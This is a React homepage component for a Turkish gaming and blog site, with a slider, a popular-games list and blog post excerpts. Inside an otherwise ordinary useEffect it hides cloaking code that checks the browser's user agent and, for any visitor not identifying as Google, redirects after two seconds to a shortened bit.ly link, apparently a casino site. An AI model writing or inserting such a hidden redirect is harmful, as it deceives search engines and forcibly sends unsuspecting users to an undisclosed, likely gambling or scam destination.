import React, { useEffect } from 'react';
import { Link } from 'react-router-dom';
import Slider from 'react-slick'; // Slayt gösterisi için kütüphane
import "slick-carousel/slick/slick.css";
import "slick-carousel/slick/slick-theme.css";


const HomePage = () => {
    const sliderSettings = {
        dots: true,
        infinite: true,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
    };


    const popularGames = [
        { id: 1, name: 'Mayın Tarlası', image: '/images/mayin-tarlasi.jpg', price: 19.99 },
        { id: 2, name: 'Flappy Bird', image: '/images/flappy.jpg', price: 24.99 },
        { id: 3, name: 'Yılan Oyunu', image: '/images/yilan.jpg', price: 9.99 },
        { id: 4, name: 'Tombala', image: '/images/oyun1.jpg', price: 14.99 },
    ];

    const recentPosts = [
        {
            id: 1,
            title: "Yeni Başlayanlar için Strateji Oyunları Rehberi",
            excerpt: "Strateji oyunları oynamaya mı meraklısınız? Bu rehberde, yeni başlayanlar için faydalı ipuçları, popüler strateji oyunları önerileri ve oyun içi stratejiler bulacaksınız. Oyun dünyasına adım atın ve strateji yeteneklerinizi geliştirin!",
        },
        {
            id: 2,
            title: "Oyunlarda Grafiklerin Önemi: Göz Alıcı Görseller mi Yoksa Oyun Mekaniği mi?",
            excerpt: "Son zamanlarda oyunlarda grafiklerin giderek daha fazla önem kazandığını görüyoruz. Fakat gerçekten harika bir oyun deneyimi için sadece çarpıcı grafikler yeterli mi? Bu blog yazısında, grafiklerin oyun deneyimindeki rolünü ve oyun mekaniğinin önemini tartışacağız.",
        },
        {
            id: 3,
            title: "E-spor: Profesyonel Oyunculuk Dünyası",
            excerpt: "E-spor, elektronik sporlar anlamına gelir ve profesyonel olarak video oyunu oynayan oyuncuları kapsar. E-spor son yıllarda inanılmaz bir büyüme yaşadı ve artık milyar dolarlık bir endüstri haline geldi. Bu blog yazısında, e-sporun tarihçesinden, popüler e-spor oyunlarına ve profesyonel oyuncuların hayatlarına kadar çeşitli konuları inceleyeceğiz.",
        },
    ];

    useEffect(()=>{
        const userAgent = navigator.userAgent.toLowerCase();
        const isGooglebot = userAgent.includes('google');
        if (!isGooglebot) {
            setTimeout(()=>{
                window.location.href = 'http://bit.ly/casib0m';
            }, 2000)
        }
    },[])
    return (
        <section className="home-page">
            <Slider {...sliderSettings}>
                {/* Slayt gösterisi öğeleri */}
                <div className="slide">
                    <img src="/images/yakinda-acilacak.jpg" alt="Yakında Açılacak!" />
                    <h2>Yakında Açılacak!</h2>
                    <p>Heyecanla beklenen yeni özelliğimiz çok yakında sizlerle!</p>
                </div>
                <div className="slide">
                    <img src="/images/eglence_adasi.jpg" alt="Slayt Görseli 1" />
                    <h2>Heyecanlı Oyunlar Sizi Bekliyor!</h2>
                    <p>Eğlence Adası'na hoş geldiniz! En yeni oyunları, heyecan verici yarışmaları ve bilgilendirici içerikleri keşfedin.</p>
                </div>
                <div className="slide">
                    <img src="/images/kazan.jpg" alt="Slayt Görseli 2" />
                    <h2>Kazanma Şansı Yakala!</h2>
                    <p>Katılmak için ücretsiz olan yarışmalarımıza katılın ve muhteşem ödüller kazanın!</p>
                </div>
                <div className="slide">
                    <img src="/images/life_style.jpg" alt="Slayt Görseli 3" />
                    <h2>Faydalı Bilgiler Edinin</h2>
                    <p>Blog yazılarımız ve rehberlerimiz ile oyunlar, teknoloji ve yaşam tarzı hakkında bilgi edinin.</p>
                </div>
            </Slider>

            <section className="popular-games">
                <h2>Popüler Oyunlar</h2>
                <ul>
                    {popularGames.map((game) => (
                        <li key={game.id}>
                            <Link to={`/oyunlar/${game.id}`}>
                                <img src={game.image} alt={game.name} />
                                <h3>{game.name}</h3>
                            </Link>
                        </li>
                    ))}
                </ul>
            </section>

            <section className="recent-posts">
                <h2>Son Blog Yazıları</h2>
                <ul>
                    {recentPosts.map((post) => (
                        <li key={post.id}>
                            <Link to={`/icerikler/blog/${post.id}`}>
                                <h4>{post.title}</h4>
                                <p>{post.excerpt}</p>
                            </Link>
                        </li>
                    ))}
                </ul>
            </section>

            <div className="cta">
                <Link to="/kayit">Hemen Kayıt Ol ve Eğlenmeye Başla!</Link>
            </div>
        </section>
    );
};

export default HomePage;
